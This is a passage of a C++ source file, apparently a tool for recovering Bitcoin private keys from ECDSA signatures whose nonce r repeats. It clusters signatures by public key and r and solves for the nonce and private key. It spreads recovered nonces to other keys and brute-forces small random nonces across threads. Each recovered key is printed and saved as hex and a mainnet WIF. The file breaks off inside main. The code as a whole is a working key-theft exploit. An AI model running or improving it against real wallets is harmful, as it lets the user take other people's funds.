// recover_stronger.cpp
// C++17 port of the Python "recover_stronger.py" core logic
// Features: primary (pub,r) recovery, k-learning, propagation,
// random-k threaded scan, preload recovered_k.jsonl, verify-pass with libsecp256k1.

#include <bits/stdc++.h>
#include <boost/multiprecision/cpp_int.hpp>
#include <nlohmann/json.hpp>
#include <secp256k1.h>
#include <openssl/sha.h>

using json = nlohmann::json;
using namespace std;
using boost::multiprecision::cpp_int;

/*

./recover_stronger \
  --sigs signatures.jsonl \
  --export-clusters dupR_clusters.jsonl \
  --report-collisions r_collisions.jsonl \
  --preload-k recovered_k.jsonl \
  --rlist r_values.txt \
  --max-iter 2 \
  --threads 8 \
  --scan-random-k 250 \
  --scan-random-k-top 0 \
  --scan-random-k-range 4294967296 \
  --verify-pass -v


*/

// ---------------- secp256k1 constants ----------------
static const cpp_int N = cpp_int("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");

// ---------------- hex & bytes helpers ----------------
static inline int hexval(char c) {
    if ('0'<=c && c<='9') return c-'0';
    if ('a'<=c && c<='f') return 10 + (c-'a');
    if ('A'<=c && c<='F') return 10 + (c-'A');
    return -1;
}

static vector<uint8_t> hex_to_bytes(const string &s) {
    string t = s;
    // strip quotes
    if (t.size()>=2 && t.front()=='"' && t.back()=='"') t = t.substr(1, t.size()-2);
    if (t.size()>=2 && t[0]=='0' && (t[1]=='x' || t[1]=='X')) t = t.substr(2);
    if (t.size()%2) t = "0"+t;
    vector<uint8_t> out; out.reserve(t.size()/2);
    for (size_t i=0;i+1<t.size();i+=2) {
        int hi=hexval(t[i]); int lo=hexval(t[i+1]);
        if (hi<0 || lo<0) return {};
        out.push_back((uint8_t)((hi<<4)|lo));
    }
    return out;
}

static string bytes_to_hex(const vector<uint8_t> &v) {
    static const char* hexd = "0123456789abcdef";
    string s; s.resize(v.size()*2);
    for (size_t i=0;i<v.size();++i) {
        s[2*i] = hexd[(v[i]>>4)&0xF];
        s[2*i+1] = hexd[v[i]&0xF];
    }
    return s;
}

static string cpp_int_to_hex(const cpp_int &x, size_t pad=0) {
    cpp_int t = x;
    if (t<0) t += N; // guard
    std::string s;
    if (t==0) s="0";
    else {
        cpp_int y=t;
        while (y>0) {
            int nib = (int)(y & 0xF);
            char c = "0123456789abcdef"[nib];
            s.push_back(c);
            y >>= 4;
        }
        reverse(s.begin(), s.end());
    }
    if (s.size() < pad) {
        string p(pad - s.size(), '0');
        s = p + s;
    }
    return s;
}

static cpp_int hex_to_cpp(const string &s) {
    string t = s;
    if (t.size()>=2 && t.front()=='"' && t.back()=='"') t = t.substr(1, t.size()-2);
    if (t.size()>=2 && t[0]=='0' && (t[1]=='x'||t[1]=='X')) t = t.substr(2);
    cpp_int x = 0;
    for (char c : t) {
        int v = hexval(c);
        if (v<0) continue;
        x <<= 4;
        x += v;
    }
    return x;
}

static vector<uint8_t> cpp_int_to_32be(const cpp_int &x) {
    vector<uint8_t> out(32,0);
    cpp_int y = x;
    for (int i=31;i>=0;--i) {
        out[i] = (uint8_t)(y & 0xFF);
        y >>= 8;
    }
    return out;
}

// ---------------- base58 + WIF ----------------
static const char* B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

static string base58_encode(const vector<uint8_t> &data) {
    // count leading zeros
    size_t zeros=0; while (zeros<data.size() && data[zeros]==0) zeros++;
    vector<unsigned char> b(data.begin(), data.end());
    vector<unsigned char> temp(b.size()*138/100+1);
    size_t j=0;
    for (size_t i=zeros;i<b.size(); ++i) {
        int carry = b[i];
        size_t k = temp.size();
        while (carry || j<k) {
            int t = (j<k ? temp[k-1] : 0)*256 + carry;
            carry = t / 58;
            int r = t % 58;
            if (j<k) temp[k-1] = (unsigned char)r;
            else temp.insert(temp.begin(), (unsigned char)r);
            j++;
            k--;
        }
        j=0;
    }
    // skip leading zeros in base58 result
    size_t it=0; while (it<temp.size() && temp[it]==0) ++it;
    string s;
    s.assign(zeros, '1');
    for (; it<temp.size(); ++it) s.push_back(B58[temp[it]]);
    return s;
}

static string sha256_hex(const vector<uint8_t> &buf) {
    uint8_t h[SHA256_DIGEST_LENGTH];
    SHA256((const unsigned char*)buf.data(), buf.size(), h);
    return bytes_to_hex(vector<uint8_t>(h,h+32));
}

static string to_wif(const cpp_int &d, bool compressed=true, bool mainnet=true) {
    vector<uint8_t> payload;
    payload.push_back(mainnet ? 0x80 : 0xEF);
    // 32 bytes big-endian
    vector<uint8_t> be = cpp_int_to_32be(d);
    payload.insert(payload.end(), be.begin(), be.end());
    if (compressed) payload.push_back(0x01);

    // double sha256 checksum
    uint8_t h1[32], h2[32];
    SHA256(payload.data(), payload.size(), h1);
    SHA256(h1, 32, h2);

    vector<uint8_t> full = payload;
    full.insert(full.end(), h2, h2+4);
    return base58_encode(full);
}

// ---------------- modular arithmetic ----------------
static inline cpp_int mod(const cpp_int &a, const cpp_int &m=N) {
    cpp_int r = a % m;
    if (r<0) r += m;
    return r;
}

static cpp_int egcd_inv(cpp_int a, const cpp_int &m=N) {
    // modular inverse via extended Euclid
    cpp_int t=0, newt=1;
    cpp_int r=m, newr=mod(a,m);
    while (newr != 0) {
        cpp_int q = r / newr;
        cpp_int tmp = t - q*newt; t = newt; newt = tmp;
        tmp = r - q*newr; r = newr; newr = tmp;
    }
    if (r > 1) throw runtime_error("not invertible");
    if (t < 0) t += m;
    return t;
}

static bool ecdsa_equation_holds(const cpp_int &s, const cpp_int &z, const cpp_int &r, const cpp_int &d, const cpp_int &k) {
    if (!(s>0 && s<N && r>0 && r<N && d>0 && d<N && k>0 && k<N)) return false;
    try {
        cpp_int lhs = mod( egcd_inv(k) * mod(z + mod(r*d)) );
        return lhs == mod(s);
    } catch (...) { return false; }
}

// ---------------- secp256k1 helpers (pub derive & verify) ----------------
struct SecpCtx {
    secp256k1_context* ctx;
    SecpCtx() {
        ctx = secp256k1_context_create(SECP256K1_CONTEXT_SIGN | SECP256K1_CONTEXT_VERIFY);
    }
    ~SecpCtx() {
        secp256k1_context_destroy(ctx);
    }
};

static bool derive_pub_hex(const cpp_int &d, string &pub_compr_hex, string &pub_uncomp_hex, SecpCtx &C) {
    vector<uint8_t> seckey = cpp_int_to_32be(d);
    if (!secp256k1_ec_seckey_verify(C.ctx, seckey.data())) return false;

    secp256k1_pubkey pub;
    if (!secp256k1_ec_pubkey_create(C.ctx, &pub, seckey.data())) return false;

    // compressed (33)
    unsigned char out33[33]; size_t out33len = 33;
    secp256k1_ec_pubkey_serialize(C.ctx, out33, &out33len, &pub, SECP256K1_EC_COMPRESSED);
    pub_compr_hex = bytes_to_hex(vector<uint8_t>(out33, out33+out33len));

    // uncompressed (65)
    unsigned char out65[65]; size_t out65len = 65;
    secp256k1_ec_pubkey_serialize(C.ctx, out65, &out65len, &pub, SECP256K1_EC_UNCOMPRESSED);
    pub_uncomp_hex = bytes_to_hex(vector<uint8_t>(out65, out65+out65len));

    // lowercase
    transform(pub_compr_hex.begin(), pub_compr_hex.end(), pub_compr_hex.begin(), ::tolower);
    transform(pub_uncomp_hex.begin(), pub_uncomp_hex.end(), pub_uncomp_hex.begin(), ::tolower);
    return true;
}

static bool verify_der_signature_hex(const string &pub_hex, const string &sig_hex_with_or_without_type, const cpp_int &z, SecpCtx &C) {
    // parse pub
    vector<uint8_t> pub_bytes = hex_to_bytes(pub_hex);
    if (pub_bytes.empty()) return false;
    secp256k1_pubkey pub;
    if (!secp256k1_ec_pubkey_parse(C.ctx, &pub, pub_bytes.data(), pub_bytes.size())) return false;

    // parse DER; strip last byte if it's sighash
    vector<uint8_t> der = hex_to_bytes(sig_hex_with_or_without_type);
    if (der.size()>=9 && der[0]==0x30) {
        // try with full; if fail, drop last byte
    } else {
        return false;
    }

    auto try_one = [&](const vector<uint8_t>& der_try)->bool{
        secp256k1_ecdsa_signature sig;
        if (!secp256k1_ecdsa_signature_parse_der(C.ctx, &sig, der_try.data(), der_try.size()))
            return false;
        // normalize here if needed
        vector<uint8_t> msg = cpp_int_to_32be(z);
        int ok = secp256k1_ecdsa_verify(C.ctx, &sig, msg.data(), &pub);
        return ok==1;
    };

    if (try_one(der)) return true;
    // try cut last byte (sighash)
    der.pop_back();
    return try_one(der);
}

// ---------------- DER (r,s) parse (with/without sighash) ----------------
static bool parse_der_sig_plus_type(const string &sighex, cpp_int &r, cpp_int &s, int &sighash) {
    vector<uint8_t> b = hex_to_bytes(sighex);
    auto parse_core = [&](const vector<uint8_t>& buf, bool assume_type)->bool{
        if (buf.size()<9 || buf[0]!=0x30) return false;
        size_t i=2;
        if (i>=buf.size() || buf[i]!=0x02) return false;
        size_t lr = buf[i+1]; i+=2; if (i+lr>buf.size()) return false;
        r = 0; for (size_t k=0;k<lr;++k) { r <<= 8; r += buf[i+k]; } i+=lr;
        if (i>=buf.size() || buf[i]!=0x02) return false;
        size_t ls = buf[i+1]; i+=2; if (i+ls>buf.size()) return false;
        s = 0; for (size_t k=0;k<ls;++k) { s <<= 8; s += buf[i+k]; }
        sighash = assume_type ? (int)buf.back() : -1;
        r = mod(r); s = mod(s);
        return true;
    };
    // try with type
    if (parse_core(b, true)) return true;
    // try without type
    if (parse_core(b, false)) return true;
    return false;
}

// ---------------- data structures ----------------
struct SigRow {
    string txid;
    int vin{0};
    cpp_int r,s,z;
    string pub;
    string sighex; // optional
};

struct Args {
    string sigs = "signatures.jsonl";
    string rlist = "";
    string out_json = "recovered_keys.jsonl";
    string out_txt  = "recovered_keys.txt";
    string out_k    = "recovered_k.jsonl";
    string pub_filter = "";
    int    min_count = 2;
    int    max_iter = 4;
    bool   testnet = false;
    string report_collisions = "r_collisions.jsonl";
    string export_clusters   = "dupR_clusters.jsonl";
    bool   verify_pass = false;
    bool   verbose = false;

    string preload_k = "recovered_k.jsonl";
    int threads = 1;
    int processes = 1; // not used in this C++ version; use threads
    long long scan_random_k = 0;
    int scan_random_k_top = 50;
    cpp_int scan_random_k_range = cpp_int(1) << 32; // default 2^32
    uint64_t rand_seed = 0;
    bool force_random_k = false;
};

static void usage() {
    cerr <<
R"(Usage: recover_stronger [options]
  --sigs FILE                signatures.jsonl (or JSON array)
  --rlist FILE               optional r_values.txt
  --out-json FILE            recovered_keys.jsonl
  --out-txt FILE             recovered_keys.txt
  --out-k FILE               recovered_k.jsonl
  --pub HEX                  filter by pubkey (33/65 bytes hex)
  --min-count N              min signatures per (pub,r) cluster (default 2)
  --max-iter N               propagation iterations (default 4)
  --testnet                  emit testnet WIF
  --report-collisions FILE   r_collisions.jsonl
  --export-clusters FILE     dupR_clusters.jsonl
  --verify-pass              extra verification pass
  -v/--verbose
  --preload-k FILE           preload recovered_k.jsonl
  --threads N                threads for random-k scan
  --scan-random-k N          per-bucket random k tries
  --scan-random-k-top N      top buckets to scan (0=all)
  --scan-random-k-range X    draw k in [1..X] (capped by n)
  --rand-seed S              RNG seed (0=OS entropy)
  --force-random-k           scan even if no unresolved pubs
)";
}

// ---------------- load rlist ----------------
static unordered_set<string> load_rlist_hex(const string &path) {
    unordered_set<string> R;
    if (path.empty()) return R;
    ifstream f(path);
    if (!f) return R;
    string line;
    while (getline(f,line)) {
        // keep hex string normalized (lowercase, no 0x)
        vector<uint8_t> b = hex_to_bytes(line);
        string h = bytes_to_hex(b);
        if (!h.empty()) R.insert(h);
    }
    return R;
}

// ---------------- load preload k ----------------
static unordered_map<string, unordered_set<string>> load_k_preload_hex(const string &path) {
    unordered_map<string, unordered_set<string>> M; // r_hex -> {k_hex}
    if (path.empty()) return M;
    ifstream f(path);
    if (!f) return M;
    string line;
    while (getline(f,line)) {
        if (line.empty()) continue;
        try {
            json j = json::parse(line);
            string rhex = j.value("r", "");
            vector<string> ks = j.value("k_candidates", vector<string>{});
            vector<uint8_t> rb = hex_to_bytes(rhex);
            string rnorm = bytes_to_hex(rb);
            auto &S = M[rnorm];
            for (auto &kh : ks) {
                vector<uint8_t> kb = hex_to_bytes(kh);
                string knorm = bytes_to_hex(kb);
                if (!knorm.empty()) S.insert(knorm);
            }
        } catch(...) {}
    }
    return M;
}

// ---------------- load signatures ----------------
static vector<SigRow> load_signatures(const Args &A) {
    vector<SigRow> rows;
    ifstream f(A.sigs);
    if (!f) { cerr << "[error] cannot open " << A.sigs << "\n"; return rows; }
    string data((istreambuf_iterator<char>(f)), istreambuf_iterator<char>());
    // detect array vs jsonl
    auto first_non_ws = find_if(data.begin(), data.end(), [](int ch){return !isspace(ch);});
    bool is_array = (first_non_ws != data.end() && *first_non_ws == '[');

    auto push_obj = [&](const json &j) {
        string pub = "";
        if (j.contains("pubkey_hex")) pub = j["pubkey_hex"].get<string>();
        else if (j.contains("pub")) pub = j["pub"].get<string>();
        else if (j.contains("pubkey")) pub = j["pubkey"].get<string>();
        if (pub.empty()) return;

        // pub filter
        auto norm_pub = pub; 
        transform(norm_pub.begin(), norm_pub.end(), norm_pub.begin(), ::tolower);
        string tpub = A.pub_filter;
        transform(tpub.begin(), tpub.end(), tpub.begin(), ::tolower);
        if (!A.pub_filter.empty() && norm_pub != tpub) return;

        if (!j.contains("z")) return;
        cpp_int z = hex_to_cpp(j["z"].get<string>());

        cpp_int r, s;
        bool have_rs = false;
        if (j.contains("r") && j.contains("s")) {
            r = hex_to_cpp(j["r"].get<string>());
            s = hex_to_cpp(j["s"].get<string>());
            if (r>0 && r<N && s>0 && s<N) have_rs = true;
        }
        string sighex = "";
        if (!have_rs && j.contains("signature_hex")) {
            sighex = j["signature_hex"].get<string>();
            int sh=0;
            if (parse_der_sig_plus_type(sighex, r, s, sh)) have_rs=true;
        } else if (j.contains("signature_hex")) {
            sighex = j["signature_hex"].get<string>();
        }
        if (!have_rs) return;

        // optional r-filter
        // handled earlier via load_rlist if needed (we keep all here)

        int vin = 0;
        if (j.contains("vin")) { try { vin = j["vin"].get<int>(); } catch(...) {} }
        string txid = j.value("txid", "");

        SigRow row;
        row.txid = txid;
        row.vin = vin;
        row.r = mod(r);
        row.s = mod(s);
        row.z = mod(z);
        row.pub = norm_pub;
        row.sighex = sighex;
        rows.push_back(row);
    };

    try {
        if (is_array) {
            json arr = json::parse(data);
            if (arr.is_array()) for (auto &j : arr) if (j.is_object()) push_obj(j);
        } else {
            // JSONL
            string line;
            stringstream ss(data);
            while (getline(ss,line)) {
                if (line.empty()) continue;
                try {
                    json j = json::parse(line);
                    if (j.is_object()) push_obj(j);
                } catch(...) {}
            }
        }
    } catch (const exception &e) {
        cerr << "[error] parse signatures: " << e.what() << "\n";
    }
    if (A.verbose) cerr << "[info] loaded " << rows.size() << " usable signatures\n";
    return rows;
}

// ---------------- grouping helpers ----------------
struct PairHash {
    size_t operator()(const pair<string,string> &p) const noexcept {
        // r_hex | pub
        string key = p.first; key.push_back('|'); key += p.second;
        return std::hash<string>{}(key);
    }
};

static string r_to_hex64(const cpp_int &r) { return cpp_int_to_hex(mod(r), 64); }

// ---------------- recovery from pair ----------------
struct Cand { cpp_int d; cpp_int k; string why; };

static vector<Cand> recover_from_pair(const cpp_int &r, const SigRow &a, const SigRow &b) {
    vector<Cand> out;
    cpp_int s1=a.s, s2=b.s, z1=a.z, z2=b.z;

    // denom = s1 - s2
    cpp_int denom = mod(s1 - s2);
    if (denom != 0) {
        try {
            cpp_int k = mod( (z1 - z2) * egcd_inv(denom) );
            cpp_int d = mod( (s1 * k - z1) * egcd_inv(r) );
            if (d>0 && d<N && k>0) out.push_back({d,k,"diff"});
        } catch(...) {}
    }
    // denom2 = s1 + s2
    cpp_int denom2 = mod(s1 + s2);
    if (denom2 != 0) {
        try {
            cpp_int k2 = mod( (z1 + z2) * egcd_inv(denom2) );
            cpp_int d2 = mod( (s1 * k2 - z1) * egcd_inv(r) );
            if (d2>0 && d2<N && k2>0) out.push_back({d2,k2,"sum"});
        } catch(...) {}
    }
    return out;
}

static size_t add_k_candidate(unordered_map<string, unordered_set<string>> &K,
                              const cpp_int &r, const cpp_int &k) {
    if (!(k>0 && k<N)) return 0;
    string rhex = r_to_hex64(r);
    string khex = cpp_int_to_hex(mod(k), 64);
    string khex_c = cpp_int_to_hex( mod(N - k), 64 );
    auto &S = K[rhex];
    size_t before = S.size();
    S.insert(khex);
    S.insert(khex_c);
    return S.size() - before;
}

// ---------------- verification pass ----------------
static void verify_pass(const Args &A,
                        const vector<SigRow> &rows,
                        const unordered_map<string, cpp_int> &priv_by_pub) {
    SecpCtx C;
    unordered_map<string, vector<SigRow>> by_pub;
    for (auto &r : rows) by_pub[r.pub].push_back(r);

    for (auto &kv : priv_by_pub) {
        const string &pub = kv.first;
        const cpp_int  &d = kv.second;
        auto it = by_pub.find(pub);
        if (it == by_pub.end()) continue;

        int checked=0, ok_eq=0, ok_der=0;
        string pc, pu;
        bool have_pub = derive_pub_hex(d, pc, pu, C);

        for (auto &sr : it->second) {
            checked++;
            // equation check via reconstructed k
            try {
                cpp_int k = mod( (sr.z + mod(sr.r * d)) * egcd_inv(sr.s) );
                if (ecdsa_equation_holds(sr.s, sr.z, sr.r, d, k)) ok_eq++;
            } catch(...) {}

            if (!sr.sighex.empty() && have_pub) {
                // use whichever matches (pc or pu)
                bool v = verify_der_signature_hex(pub, sr.sighex, sr.z, C);
                if (v) ok_der++;
            }
        }
        cout << "[verify] pub=" << pub.substr(0,16) << "… checked=" << checked
             << " eq_ok=" << ok_eq << " der_ok=" << ok_der << "\n";
    }
}

// ---------------- random-k scan (threaded) ----------------
struct RKTask {
    cpp_int r;
    vector<SigRow> rows_for_r;
    long long tries;
    uint64_t seed_jitter;
    cpp_int k_range;
};

static vector<pair<string, cpp_int>> random_k_worker(const RKTask &T) {
    vector<pair<string, cpp_int>> found; // pub -> d
    std::mt19937_64 rng(T.seed_jitter);
    cpp_int rinv;
    try { rinv = egcd_inv(T.r); } catch(...) { return found; }

    auto rand_k = [&](cpp_int hi)->cpp_int {
        // draw 64-bit blocks until enough, modulo hi
        // Note: hi is capped by caller <= N-1
        while (true) {
            // make 256-bit random, then mod hi
            cpp_int acc = 0;
            for (int i=0;i<4;i++) {
                acc <<= 64;
                acc += (cpp_int)rng();
            }
            cpp_int k = mod(acc, hi);
            if (k==0) continue;
            return k;
        }
    };

    for (long long t=0; t<T.tries; ++t) {
        cpp_int k = rand_k(T.k_range);
        for (auto &row : T.rows_for_r) {
            cpp_int d = mod( (row.s * k - row.z) * rinv );
            if (!(d>0 && d<N)) continue;

            // derive pub
            // We avoid heavy secp ops by caching? Ok directly call.
            SecpCtx C;
            string pc, pu;
            if (!derive_pub_hex(d, pc, pu, C)) continue;
            if (row.pub==pc || row.pub==pu) {
                found.emplace_back(row.pub, d);
            }
        }
    }
    return found;
}

// ---------------- main ----------------
int main(int argc, char** argv) {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    Args A;
    // parse args (simple)
    for (int i=1;i<argc;i++) {
        string k = argv[i];
        auto need = [&](string &dst)->bool{ if (i+1<argc){ dst=argv[++i]; return true;} return false; };
        auto need_ll = [&](long long &dst)->bool{ if (i+1<argc){ dst=stoll(argv[++i]); return true;} return false; };
        auto need_i = [&](int &dst)->bool{ if (i+1<argc){ dst=stoi(argv[++i]); return true;} return false; };

        if      (k=="--sigs") need(A.sigs);
        else if (k=="--rlist") need(A.rlist);
        else if (k=="--out-json") need(A.out_json);
        else if (k=="--out-txt") need(A.out_txt);
        else if (k=="--out-k") need(A.out_k);
        else if (k=="--pub") need(A.pub_filter);
        else if (k=="--min-count") need_i(A.min_count);
        else if (k=="--max-iter") need_i(A.max_iter);
        else if (k=="--testnet") A.testnet = true;
        else if (k=="--report-collisions") need(A.report_collisions);
        else if (k=="--export-clusters") need(A.export_clusters);
        else if (k=="--verify-pass") A.verify_pass = true;
        else if (k=="-v" || k=="--verbose") A.verbose = true;
        else if (k=="--preload-k") need(A.preload_k);
        else if (k=="--threads") need_i(A.threads);
        else if (k=="--processes") { int tmp; need_i(tmp); /* ignored in C++ */ }
        else if (k=="--scan-random-k") need_ll(A.scan_random_k);
        else if (k=="--scan-random-k-top") need_i(A.scan_random_k_top);
        else if (k=="--scan-random-k-range") {
            string tmp; need(tmp); A.scan_random_k_range = hex_to_cpp(tmp); // supports decimal/hex
            if (A.scan_random_k_range >= N) A.scan_random_k_range = N-1;
        }
        else if (k=="--rand-seed") {
            string tmp; need(tmp);
            A.rand_seed = strtoull(tmp.c_str(), nullptr, 10);
            if (A.rand_seed==0) {
                random_device rd; A.rand_seed = ((uint64_t)rd()<<32) ^ rd();
            }
        }
        else if (k=="--force-random-k") A.force_random_k = true;
        else { usage(); return 1; }
    }

    // load signatures
    auto rows = load_signatures(A);
    if (rows.empty()) {
        cerr << "No usable signatures; need z and (r,s) or signature_hex+pubkey_hex.\n";
        return 0;
    }

    // r-filter (optional)
    auto rfilter = load_rlist_hex(A.rlist);
    if (!rfilter.empty()) {
        vector<SigRow> filtered;
        for (auto &r : rows) {
            string rhex = r_to_hex64(r.r);
            if (rfilter.count(rhex)) filtered.push_back(r);
        }
        rows.swap(filtered);
        if (A.verbose) cerr << "[info] r-filter kept " << rows.size() << " rows\n";
        if (rows.empty()) return 0;
    }

    // group maps
    unordered_map<pair<string,string>, vector<SigRow>, PairHash> groups; // (r_hex, pub) -> rows
    unordered_map<string, vector<SigRow>> rmap; // r_hex -> rows
    unordered_map<string, vector<SigRow>> by_pub; // pub -> rows

    for (auto &sr : rows) {
        string rhex = r_to_hex64(sr.r);
        groups[{rhex, sr.pub}].push_back(sr);
        rmap[rhex].push_back(sr);
        by_pub[sr.pub].push_back(sr);
    }

    // optional exports
    if (!A.report_collisions.empty()) {
        ofstream oc(A.report_collisions);
        for (auto &kv : rmap) {
            // collect unique pubs for this r
            unordered_map<string, vector<pair<string,int>>> mp;
            for (auto &sr : kv.second) mp[sr.pub].push_back({sr.txid, sr.vin});
            if (mp.size() <= 1) continue;
            json j;
            j["r"] = kv.first;
            j["distinct_pubs"] = mp.size();
            int total = 0;
            json pubs = json::object();
            for (auto &pp : mp) {
                json arr = json::array();
                for (auto &sv : pp.second) { json it; it["txid"]=sv.first; it["vin"]=sv.second; arr.push_back(it); }
                pubs[pp.first] = arr;
                total += (int)pp.second.size();
            }
            j["pubs"] = pubs;
            j["total_sightings"] = total;
            oc << j.dump() << "\n";
        }
        if (A.verbose) cerr << "[info] wrote " << A.report_collisions << "\n";
    }

    if (!A.export_clusters.empty()) {
        ofstream oc(A.export_clusters);
        for (auto &kv : groups) {
            auto &vec = kv.second;
            if ((int)vec.size() < A.min_count) continue;
            json j;
            j["r"] = kv.first.first;
            j["pubkey"] = kv.first.second;
            j["count"] = (int)vec.size();
            json arr = json::array();
            for (auto &sr : vec) { json it; it["txid"]=sr.txid; it["vin"]=sr.vin; arr.push_back(it); }
            j["sightings"] = arr;
            oc << j.dump() << "\n";
        }
        if (A.verbose) cerr << "[info] wrote " << A.export_clusters << "\n";
    }

    // preload k
    auto recovered_k_hex = load_k_preload_hex(A.preload_k);

    vector<json> recovered_out;
    unordered_map<string, cpp_int> priv_by_pub; // pub -> d
    unordered_set<string> seen_priv_hex;

    SecpCtx C;

    auto add_recovery = [&](const string &pub, const cpp_int &d, const string &rhex,
                            const vector<pair<string,int>> &proof, const string &method) {
        string dhex = cpp_int_to_hex(mod(d), 64);
        if (seen_priv_hex.count(dhex)) return;
        // derive pub check
        string pc, pu;
        if (!derive_pub_hex(d, pc, pu, C)) return;
        if (pub != pc && pub != pu) return;

        string wif = to_wif(d, true, !A.testnet);
        json rec;
        rec["pubkey"] = pub;
        rec["priv_hex"] = dhex;
        rec["wif"] = wif;
        rec["r"] = rhex;
        json arr=json::array();
        for (auto &p: proof){ json it; it["txid"]=p.first; it["vin"]=p.second; arr.push_back(it); }
        rec["proof"]=arr;
        rec["method"]=method;
        recovered_out.push_back(rec);
        priv_by_pub[pub] = d;
        seen_priv_hex.insert(dhex);

        cout << "==============================================================\n";
        cout << "[RECOVERED] pub=" << pub << "\n";
        cout << "  d (hex): " << dhex << "\n";
        cout << "  WIF   : " << wif << "\n";
        if (proof.size()==2)
            cout << "  via   : " << proof[0].first << ":" << proof[0].second
                 << "  &  "   << proof[1].first << ":" << proof[1].second
                 << "  (" << method << ")\n";
        else if (proof.size()==1)
            cout << "  via   : " << proof[0].first << ":" << proof[0].second
                 << "  (r=" << rhex << ", " << method << ")\n";
        cout << "==============================================================\n";
    };

    auto expand_k_from_privs = [&]()->size_t{
        size_t added=0;
        for (auto &kv : priv_by_pub) {
            const string &pub = kv.first;
            const cpp_int &d   = kv.second;
            auto it = by_pub.find(pub);
            if (it==by_pub.end()) continue;
            for (auto &sr : it->second) {
                try {
                    cpp_int k = mod( (sr.z + mod(sr.r * d)) * egcd_inv(sr.s) );
                    added += add_k_candidate(recovered_k_hex, sr.r, k);
                } catch(...) {}
            }
        }
        return added;
    };

    auto propagate_with_known_k = [&]()->int{
        int new_count=0;
        for (auto &kv : recovered_k_hex) {
            const string &rhex = kv.first;
            auto itb = rmap.find(rhex);
            if (itb==rmap.end()) continue;
            // convert k set
            vector<cpp_int> kset;
            for (auto &kh : kv.second) kset.push_back(hex_to_cpp(kh));
            if (A.verbose) cerr << "[propagate r="<<rhex<<"] trying "<<kset.size()<<" k-candidate(s) over "<<itb->second.size()<<" signature(s)\n";

            cpp_int r = hex_to_cpp(rhex);
            cpp_int rinv; try { rinv = egcd_inv(r); } catch(...) { continue; }

            for (auto &sr : itb->second) {
                if (priv_by_pub.count(sr.pub)) continue;
                for (auto &k : kset) {
                    try {
                        cpp_int d = mod( (sr.s * k - sr.z) * rinv );
                        if (!(d>0 && d<N)) continue;
                        if (!ecdsa_equation_holds(sr.s, sr.z, r, d, k)) continue;

                        string pc, pu;
                        if (!derive_pub_hex(d, pc, pu, C)) continue;
                        if (sr.pub!=pc && sr.pub!=pu) continue;

                        add_recovery(sr.pub, d, rhex, { {sr.txid, sr.vin} }, "propagate-from-r");
                        new_count++;
                        break;
                    } catch(...) {}
                }
            }
        }
        return new_count;
    };

    // Phase A: primary per-(pub,r) clusters
    for (auto &kv : groups) {
        const string &rhex = kv.first.first;
        const string &pub  = kv.first.second;
        auto &lst = kv.second;
        if ((int)lst.size() < A.min_count) {
            if (A.verbose) cerr << "[-] singleton skipped (pub="<<pub.substr(0,16)<<"…, r="<<rhex<<", count="<<lst.size()<<")\n";
            continue;
        }
        if (A.verbose) cerr << "[cluster pub="<<pub.substr(0,16)<<"… r="<<rhex<<"] count="<<lst.size()<<"\n";
        cpp_int r = hex_to_cpp(rhex);

        for (size_t i=0;i<lst.size();++i) for (size_t j=i+1;j<lst.size();++j) {
            auto cands = recover_from_pair(r, lst[i], lst[j]);
            for (auto &c : cands) {
                if (!ecdsa_equation_holds(lst[i].s, lst[i].z, r, c.d, c.k)) continue;
                if (!ecdsa_equation_holds(lst[j].s, lst[j].z, r, c.d, c.k)) continue;

                string pc, pu;
                if (!derive_pub_hex(c.d, pc, pu, C)) continue;
                if (pub!=pc && pub!=pu) continue;

                // record priv
                add_recovery(pub, c.d, rhex, { {lst[i].txid,lst[i].vin}, {lst[j].txid,lst[j].vin} }, string("primary-")+c.why);
                // add k and complements
                add_k_candidate(recovered_k_hex, r, c.k);
                try {
                    cpp_int k_i = mod( (lst[i].z + mod(r*c.d)) * egcd_inv(lst[i].s) );
                    add_k_candidate(recovered_k_hex, r, k_i);
                    cpp_int k_j = mod( (lst[j].z + mod(r*c.d)) * egcd_inv(lst[j].s) );
                    add_k_candidate(recovered_k_hex, r, k_j);
                } catch(...) {}
            }
        }
    }

    // Iterative loop: random-k (threads) -> expand_k -> propagate
    for (int it=1; it<=A.max_iter; ++it) {
        // Random-k scan (optional)
        if (A.scan_random_k > 0) {
            // collect targets sorted by unresolved pubs count
            struct Bucket { string rhex; int unresolved; int sigs; };
            vector<Bucket> T;
            for (auto &kv : rmap) {
                int unresolved=0;
                unordered_set<string> pubs;
                for (auto &sr : kv.second) pubs.insert(sr.pub);
                for (auto &p : pubs) if (!priv_by_pub.count(p)) unresolved++;
                T.push_back({kv.first, unresolved, (int)kv.second.size()});
            }
            sort(T.begin(), T.end(), [](const Bucket&a, const Bucket&b){
                if (a.unresolved!=b.unresolved) return a.unresolved>b.unresolved;
                return a.sigs>b.sigs;
            });
            if (A.scan_random_k_top>0 && (int)T.size()>A.scan_random_k_top) T.resize(A.scan_random_k_top);

            if (A.verbose) {
                cout << "[random-k/threads] threads=" << A.threads
                     << ", per-bucket=" << A.scan_random_k
                     << ", top=" << (A.scan_random_k_top)
                     << ", range=" << cpp_int_to_hex(A.scan_random_k_range)
                     << ", seed=" << A.rand_seed << "\n";
            }

            // build tasks
            vector<RKTask> tasks;
            std::mt19937_64 rng(A.rand_seed ? A.rand_seed : ((uint64_t)time(nullptr) ^ 0x9e3779b97f4a7c15ULL));
            for (auto &b : T) {
                if (b.sigs<=0) continue;
                if (b.unresolved==0 && !A.force_random_k) continue;
                RKTask t;
                t.r = hex_to_cpp(b.rhex);
                t.rows_for_r = rmap[b.rhex];
                t.tries = A.scan_random_k;
                t.seed_jitter = rng();
                t.k_range = (A.scan_random_k_range < N ? A.scan_random_k_range : (N-1));
                tasks.push_back(std::move(t));
            }

            // run threads
            vector<thread> pool;
            mutex mtx;
            size_t next_idx = 0;
            vector<pair<string, cpp_int>> found; // pub -> d

            auto worker = [&](){
                while (true) {
                    size_t idx;
                    {
                        lock_guard<mutex> lk(mtx);
                        if (next_idx >= tasks.size()) break;
                        idx = next_idx++;
                    }
                    auto outs = random_k_worker(tasks[idx]);
                    if (!outs.empty()) {
                        lock_guard<mutex> lk(mtx);
                        for (auto &p : outs) found.push_back(p);
                    }
                }
            };

            int th = max(1, A.threads);
            for (int i=0;i<th;i++) pool.emplace_back(worker);
            for (auto &thd : pool) thd.join();
